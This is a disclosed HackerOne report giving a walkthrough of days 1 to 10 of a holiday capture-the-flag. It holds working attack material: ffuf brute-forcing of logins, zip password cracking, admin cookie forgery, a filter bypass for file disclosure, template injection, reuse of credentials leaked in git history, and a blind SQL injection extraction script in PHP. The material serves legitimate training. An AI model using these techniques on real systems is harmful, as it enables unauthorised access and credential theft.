# ctf walkthrough

## Report Details
- **Report ID**: 1065468
- **URL**: https://hackerone.com/reports/1065468
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-12-23T20:18:29.608Z
- **Disclosed**: 2021-01-12T22:51:10.421Z

## Reporter
- **Username**: rekter0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
Hi, 
finally managed to solve all challenges, this was my first h1ctf, some challenges were pretty nice, some others had some frustrating guessing parts, but overall it was fun.


Here goes day1 to day12 walkthroughs:

## Day 1


we have only one asset in scope hackyholidays.h1ctf.com
the main page at https://hackerone.com/h1-ctf?type=team looks quite static, with a little files fuzzing or just by guessing first flag is at robots.txt

https://hackyholidays.h1ctf.com/robots.txt

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

we get flag1 and endpoint for day2 challenge




----------------------------------------------------------------


## Day 2 


fetching day2 challenge page, https://hackyholidays.h1ctf.com/s3cr3t-ar3a, another static looking under construction page, except we have some js files this time
```
<script src="/assets/js/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
```

bootstrap js file is from a cdn, probably nothing special there while jquery is self hosted
by checking it, first line is a comment that shows jquery version `/*! jQuery v3.5.1 | (c) JS Foundation and other contributors | jquery.org/license */`

went to diff challenge jquery file with original jquery 3.5.1 file from here `https://code.jquery.com/jquery-3.5.1.min.js`

first i used js beautifier on both files, you can install it with `pip install jsbeautifier`
```
$ js-beautify jquery.min.js > 1      
$ js-beautify jquery-3.5.1.min.js > 2
$ diff 1 2
37,48c37
<         },
<         h1_0 = 'la',
<         h1_1 = '}',
<         h1_2 = '',
<         h1_3 = 'f',
<         h1_4 = 'g',
<         h1_5 = '{b7ebcb75',
<         h1_6 = '8454-',
<         h1_7 = 'cfb9574459f7',
<         h1_8 = '-9100-4f91-';
<     document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
<     document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
---
>         };
```

there looks like we have some flag parts splited on some js variables, concatinating them in the right order will give us the flag
```
$ node
> h1_0 = 'la',
... h1_1 = '}',
... h1_2 = '',
... h1_3 = 'f',
... h1_4 = 'g',
... h1_5 = '{b7ebcb75',
... h1_6 = '8454-',
... h1_7 = 'cfb9574459f7',
... h1_8 = '-9100-4f91-';
'-9100-4f91-'
> 
> console.log(h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
```

and obviously day3 challenge will be located at `/apps`



----------------------------------------------------------------


## Day 3


fetching page, https://hackyholidays.h1ctf.com/apps, it looks like this page will host links for next days challenges
today challenge is at https://hackyholidays.h1ctf.com/people-rater

by looking at today's app, we have 2 options, to load more entries or check the rating for an entry
let's load some more entries

```
$ curl https://hackyholidays.h1ctf.com/people-rater/page/2
{"results":[{"id":"eyJpZCI6N30=","name":"Beatriz Rasmussen"},{"id":"eyJpZCI6OH0=","name":"Carly Legge"},{"id":"eyJpZCI6OX0=","name":"Violet Hussain"},{"id":"eyJpZCI6MTB9","name":"Leonidas Delarosa"},{"id":"eyJpZCI6MTF9","name":"Sanya Lancaster"}]}
```

there's an integer as page number in the GET request, i went to increment it untill there's no more new entries, still no flag
each entry has a `name` and a an `id`
the ids seems base64 encoded, decoding one of them shows up as a json data `{"id":[int]}`

now, to check the rating for an entry, a GET http request is made as the following:
```
$ curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=
{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
```

again, we have that base64 encoded id, since the id seemed as an incrementing int, i went fuzzing for some ids from 0 to 100 with bash and curl to see if something comes up
```
$ for i in {0..100}
do
curl https://hackyholidays.h1ctf.com/people-rater/entry?id=`printf "{\"id\":${i}}"|base64`
done
["Entry not found"]{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}{"id":"eyJpZCI6M30=","name":"Mihai Matthews","rating":"Loathsome"}{"id":"eyJpZCI6NH0=","name":"Ruth Ward","rating":"Disgusting"}
....
....
....
```
and flag was there at id=1


----------------------------------------------------------------

## Day 4


today's app is swag-shop https://hackyholidays.h1ctf.com/swag-shop

at the bottom of the page source there's some javascript code
```JAVASCRIPT
$.getJSON("/swag-shop/api/stock", function(o) {
    $.each(o.products, function(o, t) {
        $(".product-holder").append('<div class="col-md-4 product-box"><div><img class="img-responsive" src="/assets/images/product_image_coming_soon.jpg"></div><div class="text-center product-name">' + t.name + '</div><div class="text-center product-cost">&dollar;' + t.cost + '</div><div class="text-center"><input type="button" data-product-id="' + t.id + '" class="btn btn-success purchase" value="Purchase"></div></div>')
    }), $("input.purchase").click(function() {
        $.post("/swag-shop/api/purchase", {
            id: $(this).attr("data-product-id")
        }, function(o) {
            window.location = "/swag-shop/checkout/" + o.checkoutURL
        }).fail(function() {
            $("#login_modal").modal("show")
        })
    })
}), $(".loginbtn").click(function() {
    $.post("/swag-shop/api/login", {
        username: $('input[name="username"]').val(),
        password: $('input[name="password"]').val()
    }, function(o) {
        document.cookie("token=" + o.token), window.location = "/swag-shop"
    }).fail(function() {
        alert("Login Failed")
    })
});
```
looks like the swag shop is interacting with an API located at `/swag-shop/api/[endpoint]`
i went to fuzz hoping to find some more api endpoints
i used ffuf, you can obtain it here `https://github.com/ffuf/ffuf` and wordlists from SecLists, here `https://github.com/danielmiessler/SecLists`

```
$ ffuf -w ./SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u "https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ" -mc all -fc 404 -fs 155
[...]

 :: Method           : GET
 :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ
 :: Wordlist         : FUZZ: ./SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
 :: Filter           : Response size: 155
________________________________________________

user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]

```
we have 2 more endpoints that doesnt exist in the js code from earlier
i went fetching them both to see what we got new

```
curl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq
{
  "sessions": [
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
    "eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
  ]
}

```

sessions look like base64 encoded json data, by decoding the data all of them look very similar except for this one, that has some data in user field.

```
$ for i in $(curl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq -r ".sessions|.[]"); do printf $i|base64 -d;echo; done
{"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="}
{"user":null,"cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="}
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
{"user":null,"cookie":"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="}
{"user":null,"cookie":"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="}
{"user":null,"cookie":"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="}
{"user":null,"cookie":"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="}
{"user":null,"cookie":"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="}

```

now back to /user endpoint

```
$ curl https://hackyholidays.h1ctf.com/swag-shop/api/user
{"error":"Missing required fields"}
```

so we are missing a parameter here from the error message, lets do some more fuzzing for GET parameters to `/user` API endpoint, again using ffuf and parameters wordlist obtained from https://wordlists.assetnote.io/ 

```
$ ffuf -w ./httparchive_parameters_top_1m_2020_11_21.txt -u "https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=test" -mc all -fs 35
[...]

 :: Method           : GET
 :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=test
 :: Wordlist         : FUZZ: ./httparchive_parameters_top_1m_2020_11_21.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 35
________________________________________________

uuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]
````
there's a param discovered called uuid, it makes sense now that the user field obtained from sessions looks like a uuid
lets fetch it

```
$ curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}

```
and bingo, a flag!


----------------------------------------------------------------


## Day 5


today's challenge is securelogin https://hackyholidays.h1ctf.com/secure-login, it doesn't seem much more than the login form, by entering any user/pass combination we have the error message `Invalid Username`, so apparently we can enumerate valid users as a first step! so brutefocing this time with ffuf and SecLists to the rescue.

```
ffuf -w ./10-million-password-list-top-1000.txt -u https://hackyholidays.h1ctf.com/secure-login -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=FUZZ&password=test' -mc all -fr 'Invalid Username'
[...]

 :: Method           : POST
 :: URL              : https://hackyholidays.h1ctf.com/secure-login
 :: Wordlist         : FUZZ: ./10-million-password-list-top-1000.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=test
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Regexp: Invalid Username
________________________________________________

access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
```

we got a valid user name `access`, by testing it in the form with a random pass, new error msg pops up `Invalid Password`
now to bruteforce the password using same attack

```
ffuf -w ./10-million-password-list-top-1000.txt -u https://hackyholidays.h1ctf.com/secure-login -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=access&password=FUZZ' -mc all -fr 'Invalid Password'
[...]

 :: Method           : POST
 :: URL              : https://hackyholidays.h1ctf.com/secure-login
 :: Wordlist         : FUZZ: ./10-million-password-list-top-1000.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=access&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Regexp: Invalid Password
________________________________________________

computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
```
we now got access using creds `access:computer`, but nothing much inside, 
the cookie that was set after logging in is `securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D`, again another json base64 data, decoding it we get `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`, the `admin` field looks promising, by changing false to true and re-encoding the json `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==`, we now have access to download a zip file located at https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip

the zip is password protected, i used fcrackzip here `https://github.com/hyc/fcrackzip` and rockyou wordlist here `https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt`

```
$ fcrackzip -v -D -u -p /home/rekt/tools/wordlist/rockyou.txt /home/rekt/Downloads/my_secure_files_not_for_you.zip
found file 'xxx.png', (size cp/uc 215105/215058, flags 9, chk 852f)
found file 'flag.txt', (size cp/uc     55/    43, flags 9, chk 82ca)


PASSWORD FOUND!!!!: pw == hahahaha

$ unzip my_secure_files_not_for_you.zip 
Archive:  my_secure_files_not_for_you.zip
[my_secure_files_not_for_you.zip] xxx.png password: 
  inflating: xxx.png                 
 extracting: flag.txt                

$ cat flag.txt 
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```

flag and a grinch picture :)


----------------------------------------------------------------


## Day 6


my-diary is day6's challenge here https://hackyholidays.h1ctf.com/my-diary/ 
by browsing main page we're redirected to `/my-diary/?template=entries.html`

i tried /my-diary/entries.html and it show's the same content, so i assumed that the file is provided to template GET parameter is being read and shown
also i tried checking which backend it is, after few tries, home page is index.php
so i tried reading it and i got the source code


```PHP
$ curl "https://hackyholidays.h1ctf.com/my-diary/?template=index.php"

<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

looks like we have a local file disclosure bug if the file name matches the regex `[a-zA-Z0-9.]`, any other chars will be truncated

now, browsing to /secretadmin.php says that we are not allowed to view it from my ip, `You cannot view this page from your IP Address`

the file read bug to the rescue then,
we have str_replace used twice to truncate strings `admin.php` and `secretadmin.php`
luckily str_replace is not recursive

```
$ php -a
Interactive mode enabled

php > echo str_replace("admin.php","","admadmin.phpin.php");
admin.php
php > 

```

let's build secretadmin.php in a way that survives str_replace 

```
$ php -a
Interactive mode enabled

php > $page = preg_replace('/([^a-zA-Z0-9.])/','','secretsecretadmiadmin.phpn.phpadmin.phadmin.phpp');
php > $page = str_replace("admin.php","",$page);
php > $page = str_replace("secretadmin.php","",$page);
php > echo $page;
secretadmin.php
php > 
```
`secretsecretadmiadmin.phpn.phpadmin.phadmin.phpp` will do the job :)

now by browsing to https://hackyholidays.h1ctf.com/my-diary/?template=secretsecretadmiadmin.phpn.phpadmin.phadmin.phpp, we obtain the flag 
	
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}


----------------------------------------------------------------


## Day 7


Day7's app is hate-mail-generator located at https://hackyholidays.h1ctf.com/hate-mail-generator/
we could either create new campains or consult the already existing ones

we already have one campaign, https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030 
from there we can learn about the templating syntax 
`{{template:cbdj3_grinch_header.html}}` seems to read and show the given file 
`{{name}}` prints variable called name


now back to make a new campain, we can't create any, but we can preview them 
https://hackyholidays.h1ctf.com/hate-mail-generator/new
by entering a non existing template file `{{template:blabla.html}}` file we get a message `Cannot find template file /templates/blabla.html`
so templates files are located at `/templates` directory, luckily directory listing is enabled https://hackyholidays.h1ctf.com/hate-mail-generator/templates
there's 3 files, we already know about those 2 files from the existing campaign `cbdj3_grinch_header.html` and `cbdj3_grinch_footer.html`
browsing any of the files directly returns 403

we want to read the 3rd template file `38dhs_admins_only_header.html `, lets try it with preview campaign function in the app

```HTTP
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 151
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

preview_markup=%7B%7Btemplate%3A38dhs_admins_only_header.html+%7D%7D&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D


HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 21 Dec 2020 20:16:53 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 64

You do not have access to the file 38dhs_admins_only_header.html
```

prevew_markup contains our campaign markup and preview_data contains a json with name (from the form) and email

so there seems to be some kind of blacklist on that template file on preview_markup parameter

but we still can put anything in preveiew_data, it's not blacklisted there and we call it from preview_markup
by adding {{template:38dhs_admins_only_header.html}} at name for example and we call name as a variable we get the flag

```HTTP
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 123
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

preview_markup=%7B%7Bname%7D%7D&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}


HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 21 Dec 2020 20:20:27 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 339

<html>
<body>
<center>
    <table width="700">
        <tr>
            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
        </tr>
        <tr>
            <td style="padding:20px 10px 20px 10px">
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
```

that's it for day7

----------------------------------------------------------------

## Day 8


this day's challenge is a forum located at https://hackyholidays.h1ctf.com/forum
after lot of fuzzing and searching, couldn't come up with anything except `/forum/phpmyadmin` endpoint which looks like phpmyadmin interface, but we need db creds to access it,
after quite some time went to adam's github `https://github.com/adamtlangley`, we can see in his activity he created this repo `https://github.com/Grinch-Networks/forum` on december 7th, now we got forum source code !
i spent quite sometime on the source code, and i wasn't able to find anything, that's when i went back to see commits history in github https://github.com/Grinch-Networks/forum/commits/main

commit `07799dce61d7c3add39d435bdac534097de404dc` has initial code release with db creds for file `models/Db.php`
https://github.com/Grinch-Networks/forum/commit/07799dce61d7c3add39d435bdac534097de404dc#diff-998930400b08c30f6949f365207fd1d0c693d22ae5de6b9de752ef5c57ce9754
```
 self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
```

we use it to login to phpmyadmin
then we have users table with users password hashes https://hackyholidays.h1ctf.com/forum/phpmyadmin?db=forum&table=user
```
35D652126CA1706B59DB02C93E0C9FBF
388E015BC43980947FCE0E5DB16481D1
```
checked both users hashes on `crackstation.net`
grinch user password hash reversed to BahHumbug, let's login to forum now!

we use it to login then and we go to the admin section we find a post with flag inside flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}


----------------------------------------------------------------

## Day 9


this day's challenge located at https://hackyholidays.h1ctf.com/evil-quiz
the app workflow is very simple, 
1- input your name
2- fill the quiz
3- obtain result + how many other users use the same name as name we put in step1

after playing a bit around that workflow, found that there's a blind second order SQLi in name input from step1 and the result is in step3

- name `aaa'or'1'='1` we get `There is 494202 other player(s) with the same name as you!` 
- name `aaa'or'1'='2` we get `There is 8 other player(s) with the same name as you!` 

fair enough, since its blind sqli i tried to guess some tables,columns to reduce the number of requests and luckily it was easy to guess

since we have a login page that says it's only for admin, my guess was that table could be admin
- name `admin' and ((select 1 from admin limit 0,1)=1)-- -` returns `There is 67 other player(s) with the same name as you!`
- name `admin' and ((select 1 from blablacolumn limit 0,1)=1)-- -` returns `There is 0 other player(s) with the same name as you!`
looks like admin is a correct table name

now to guess columns for table admin
- name `admin' and ((select 1 from information_schema.columns where table_name='admin' and column_name='username' limit 0,1)=1)-- -` returns `There is 67 other player(s) with the same name as you!`
- name `admin' and ((select 1 from information_schema.columns where table_name='admin' and column_name='password' limit 0,1)=1)-- -` returns `There is 67 other player(s) with the same name as you!`

so table admin with username and password columns, 

- name `admin' and ((select 1 from admin where username='admin' limit 0,1)=1)-- -` returns `There is 67 other player(s) with the same name as you!`
first record in table admin has username='admin' :)

only his password to fetch now, this cannot be guessed and will be painful manually
so i did the following script to automate the extraction, it's not perfect but it does the job,
we can use same session to go through setting a name and fetching score page, we only have to fill the quiz manually first time manually and we use that session inside this solver

* made the comparaison with hex value to avoid case insensitivity 

```PHP
<?php
$str = "";
for($j=1;$j<20;$j++){
    for($i=32;$i<128;$i++){
        $abc = "(select%20hex(substr(password,".$j.",1))%20from%20admin%20limit%200,1)=%27".dechex($i)."%27";
        if(dosql($abc)=='There is 1 other player(s) with the same name as you!'){
            $str .=chr($i);
            echo $str."\n";
            break;
        }
    }
}
function dosql($str){
    get_url("https://hackyholidays.h1ctf.com/evil-quiz","session=6abf0c2ba645d92e07859120434031a5","name=-2223232323'union select 1,2,3,4 from information_schema.tables WHERE ".$str."-- -");
    $kk= get_url("https://hackyholidays.h1ctf.com/evil-quiz/score","session=6abf0c2ba645d92e07859120434031a5")['html'];
    preg_match("/<div style=\"margin-top\:20px\">(.*?)<\/div>/", $kk,$ma);
    return @$ma[1];
}
function get_url($url,$cookie="",$post="") {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    if( !empty($post) ) {
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_COOKIE, $cookie);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_TIMEOUT,60);
    $html = curl_exec($curl);
    $info = curl_getinfo($curl);
    $error = '';
    if( $html === false ) {
        $error = 'Curl error: ' . curl_error($curl);
    }               
    curl_close($curl);
    $arr = array();
    $arr['html'] = $html;
    $arr['info'] = $info;
    $arr['error'] = $error;
    return $arr;    
}
```


```	
	$ php sqli.php
	S
	S3
	S3c
	S3cr
	S3cre
	S3creT
	S3creT_
	S3creT_p
	S3creT_p4
	S3creT_p4s
	S3creT_p4ss
	S3creT_p4ssw
	S3creT_p4ssw0
	S3creT_p4ssw0r
	S3creT_p4ssw0rd
	S3creT_p4ssw0rd-
	S3creT_p4ssw0rd-$
```

we now login with `admin:S3creT_p4ssw0rd-$` it and flag is printed flag{6e8a2df4-5b14-400f-a85a-08a260b59135}


----------------------------------------------------------------

## Day 10


Day10's challenge is signup-manager located at https://hackyholidays.h1ctf.com/signup-manager/
main page html source code has in first line reference to README.md file `<!-- See README.md for assistance -->`
we could download it from https://hackyholidays.h1ctf.com/signup-manager/README.md

it has all the explaination and files :?, needed to complate this challenge
```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into
2) Move signupmanager.zip into the new directory and unzip it.
3) For security move users.txt into a directory that cannot be read from website visitors
4) Update index.php with the location of your users.txt file
5) Edit the user and admin php files to display your hidden content
6) You can make anyone an admin by changing the last character in the users.txt file to a Y
7) Default login is admin / password
```

based on the install instructions, i looked up the file `signupmanager.zip` and it's still there and it has the app source code
i looked up `users.txt` file, but it was changed 

all the magic is happening in index.php file, the rest of files and used more/less as a templates files and cannot be called directly because of line `if( !isset($page) ) die("You cannot access this page directly"); ?>`

